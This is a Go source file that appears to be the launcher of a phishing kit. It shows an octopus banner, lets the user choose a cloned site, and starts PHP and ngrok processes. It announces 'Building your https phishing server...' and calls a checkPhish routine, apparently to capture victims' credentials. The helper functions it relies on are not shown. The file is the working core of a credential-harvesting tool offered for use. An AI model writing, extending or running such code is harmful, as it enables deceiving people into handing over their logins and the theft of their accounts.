package main

import (
	"fmt"
	"os"
	"sort"
	"sync"
	"time"
)

const (
	colorReset  = "\033[0m"
	colorRed    = "\033[31m"
	colorGreen  = "\033[32m"
	colorYellow = "\033[33m"
	colorWhite  = "\033[37m"
)

func printTitle(titleColor, octopusColor string) {
	fmt.Printf("%s _____      _                        _       	   %s       ,'\"\"`.\n", titleColor, octopusColor)
	fmt.Printf("%s|  _  |    | |                      | |      	    %s     / _  _ \\\n", titleColor, octopusColor)
	fmt.Printf("%s| | | | ___| |_ ___  _ __   ___   __| | __ _ 	   %s      |(@)(@)|\n", titleColor, octopusColor)
	fmt.Printf("%s| | | |/ __| __/ _ \\| '_ \\ / _ \\ / _` |/ _` |	 %s        )  __  (\n", titleColor, octopusColor)
	fmt.Printf("%s\\ \\_/ / (__| || (_) | |_) | (_) | (_| | (_| |	     %s   /,'))((`.\\\n", titleColor, octopusColor)
	fmt.Printf("%s \\___/ \\___|\\__\\___/| .__/ \\___/ \\__,_|\\__,_|	%s       (( ((  )) ))\n", titleColor, octopusColor)
	fmt.Printf("%s                    | |                     %s 	        `\\ `)(' /'\n", titleColor, octopusColor)
	fmt.Printf("%s                    |_|                %s    \n", titleColor, string(colorReset))

}

func printStartMessage(wg *sync.WaitGroup) {
	defer wg.Done()
	// Clear the screen
	fmt.Print("\033[H\033[2J")
	printTitle(string(colorWhite), string(colorYellow))
	time.Sleep(500 * time.Millisecond)

	// Clear the screen
	fmt.Print("\033[H\033[2J")
	printTitle(string(colorWhite), string(colorGreen))
	time.Sleep(500 * time.Millisecond)

	// Clear the screen
	fmt.Print("\033[H\033[2J")
	printTitle(string(colorWhite), string(colorRed))
	time.Sleep(500 * time.Millisecond)

	// Clear the screen
	fmt.Print("\033[H\033[2J")
	printTitle(string(colorWhite), string(colorYellow))
	time.Sleep(500 * time.Millisecond)

}

func printAllAvailableSites(sites map[int]string) {
	fmt.Println()

	keys := make([]int, 0, len(sites))
	for key := range sites {
		keys = append(keys, key)
	}
	sort.Ints(keys)

	for _, k := range keys {
		fmt.Printf("%s[%s%d%s] %s\n", string(colorWhite), string(colorYellow), k, string(colorWhite), sites[k])
	}
	fmt.Print(string(colorReset))

}

func getAllAvailableSites() (map[int]string, error) {

	var sites map[int]string
	sites = make(map[int]string)
	f, err := os.Open("sites")
	if err != nil {
		return sites, err
	}
	fileInfo, err := f.Readdir(0)
	f.Close()

	if err != nil {
		return sites, err
	}

	for key, file := range fileInfo {
		sites[key+1] = file.Name()
	}
	return sites, nil

}

func siteChooser(sites map[int]string) string {

	fmt.Printf("%s[%s*%s]%s Please choose a site: %s", string(colorYellow), string(colorWhite), string(colorYellow), string(colorWhite), string(colorReset))
	var num int
	for {
		fmt.Scanf("%d", &num)
		if value, ok := sites[num]; ok {
			return value
		}

		fmt.Printf("%s[%s*%s]%s Invalid Option! Choose a site: %s", string(colorYellow), string(colorWhite), string(colorYellow), string(colorWhite), string(colorReset))
	}
}

func main() {
	//setting up:
	var wg sync.WaitGroup
	wg.Add(1)
	go printStartMessage(&wg)
	if err := setNgrok(); err != nil {
		panic(err)
	}
	wg.Wait()
	/////////

	sites, err := getAllAvailableSites()
	if err != nil {
		panic(err)
	}
	printAllAvailableSites(sites)
	site := siteChooser(sites)

	fmt.Println()

	php, err := executePhp(site)
	if err != nil {
		panic(err)
	}
	ngrok,  err := executeNgrok()
	if err != nil {
		panic(err)
	}

	fmt.Println("Building your https phishing server...")
	go getURL()

	go checkPhish(site)
	fmt.Scanln()
	//time.Sleep(30 * time.Second)

	php.Process.Kill()
	ngrok.Process.Kill()
	fmt.Println()
}
